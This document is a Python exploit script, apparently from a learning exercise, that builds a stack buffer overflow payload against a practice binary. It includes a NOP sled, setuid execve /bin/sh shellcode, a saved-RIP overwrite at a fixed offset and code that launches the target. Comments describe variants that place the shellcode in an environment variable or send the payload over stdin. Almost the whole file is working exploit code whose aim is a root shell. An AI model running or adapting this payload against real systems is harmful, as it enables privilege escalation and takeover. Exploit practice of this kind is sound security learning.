#!/usr/bin/python3
import sys
from subprocess import Popen, PIPE
import shlex
import struct

'''
Exploit Development on 
> x86-64 Arch => Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux
> ARM Arch => 

Triggering manual exploitation
$ ./exploit_000_experimental.py			# to generate malicious input file 
$ ./000_experimental.elf $(cat ./malinput.000_experimental.exploit_000)

STACK DIAGRAM (view INSIDE GDB)

        +------------+ 
        |   buffer   |	0x7fffffffd570
        +------------+
			...
			...
		+------------+ <--- CONTROL POINT @ offset of 1016 from buffer
        | saved RIP  |  0x7fffffffd968
        +------------+

STACK state before ACID rain
STACK state after ACID rain
'''

target = "./000_experimental.elf"
offset = 1016
#shellcode = "./execve_binsh.raw"
shellcode = "./setuid_execve_binsh.raw"

print ("READING shellcode from: " + shellcode, end = '')
fo = open(shellcode, 'rb')
shellcode = fo.read()
fo.close()

# CREATE payload
payload = bytearray()
payload += b"\x90"*500
payload += shellcode
payload += b"\x90"*(offset-len(payload))
# overwriting saved RIP with
# 1. shellcode injected inside buffer
#payload += b'\x70\xd6\xff\xff\xff\x7f'		# 0x7fffffffd670 : i.e. jump to 256 bytes inside buffer (on NOP sled)
# 2. shellcode AFTER buffer
# 3. shellcode injection via environment variable
# add a 200 byte NOP sled before shellcode in environment variable
# $ export SHELLCODE=$(python2 -c 'print "\x90"*200')$(cat ./execve_binsh.raw)

# However, SHELLCODE with a NOP sled is not required (with predictEnvVarAddress.elf)
# $ export SHELLCODE=$(cat ./execve_binsh.raw)
# $ ./predictEnvVarAddress.elf ./000_experimental.elf SHELLCODE
# For prog "./000_experimental.elf": SHELLCODE (env-var) will be located at 0x7fffffffefc5
# EDIT/CONFIGURE return address in exploit script to return to above address
# $ ./exploit_000_experimental.py
# $ ./000_experimental.elf $(cat ./malinput.000_experimental.exploit_000)
# shell spawned ....
#payload += b"\xc5\xef\xff\xff\xff\x7f"
payload += b"\xef\xbe\xff\xff\xff\x7f"

print ("CREATED payload: ", end = '')
print (payload)

# WRITE payload to DISK (useful to trigger manual exploitation)
filename = 'malinput.' + target[:-4].replace("./", "") + "." + sys.argv[0].replace("./", '')[:11]
fo = open( filename, 'wb')
fo.write(payload)
fo.close()
print ("WROTE payload to disk: " + filename)

# -x-x-x-x- SEND payload to vulnerable process -x-x-x-x-

print ("SENDING payload to target process: " + target)
print ()

# Send payload via CMD Line arguments
pivot = Popen("cat".split(), stdout=PIPE)
p = Popen([target, bytes(payload)], stdin=pivot.stdout)
pivot.wait()

'''
# Send payload via ENVIRONMENT variable
'''

'''
# Send payload via STDIN
p = Popen(shlex.split(target), stdin=PIPE)
p.stdin.write(payload)
p.stdin.flush()
'''
